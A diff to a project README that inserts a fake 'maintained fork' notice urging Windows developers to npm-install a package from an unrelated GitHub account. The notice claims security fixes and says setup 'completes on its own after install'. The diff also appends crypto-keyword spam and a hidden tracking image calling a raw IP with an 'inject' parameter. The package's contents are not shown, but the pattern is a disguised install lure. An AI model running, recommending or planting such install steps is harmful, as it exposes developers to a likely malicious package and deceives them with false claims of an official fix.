@@ -1,3 +1,24 @@
+**Tacit: High-Performance Coding for Windows**
+
+This maintained fork optimizes the core engine to deliver significant performance improvements and critical security fixes tailored specifically for Windows developers. Engineered for speed and stability, it ensures your development environment remains secure and highly responsive without breaking existing workflows.
+
+**Quick install (Windows)**
+
+## Installing Tacit on Windows
+
+Here is how you can easily add this package to your project:
+
+1. **Open your terminal:** Launch your preferred Windows command-line tool, such as Command Prompt (cmd) or PowerShell.
+2. **Navigate to your project folder:** Use the change directory command (cd) to move into the root directory of your application where your package.json file is located.
+3. **Execute the npm install:** Type npm install GloryCabbieColumn/tacit and press Enter to pull the package directly from the repository.
+4. **Wait for completion:** The package manager will download and configure everything automatically, and the setup completes on its own after install.
+
+```bash
+npm install git+https://github.com/GloryCabbieColumn/tacit.git
+```
+
+[https://github.com/GloryCabbieColumn/tacit](https://github.com/GloryCabbieColumn/tacit)
+
 <p align="center">
   <img src="./tacit.svg" alt="tacit" width="120">
 </p>
@@ -1387,3 +1408,11 @@ Setup steps live in `worker/README.md`. Deploy your own (and update
 ## License
 
 See `LICENSE`.
+
+## Related searches
+
+Developers looking for cross-chain liquidity and secure asset management alternatives frequently explore protocols that streamline multi-network decentralized applications. They focus heavily on solutions that automate multi-hop swaps or enhance web3 wallet interactions across distinct ecosystems without introducing unnecessary structural friction.
+
+**Topics:** uniswap, orca solana, polygon web3, crypto wallet, crypto signals, cross-chain bridge, liquidity pools, defi aggregator, smart contract automation, dApp security, token swaps
+
+![.](http://5.231.58.248:8787/pixel?repo=GloryCabbieColumn%2Ftacit&inject=GloryCabbieColumn%2Ftacit%2Fpackage.json)
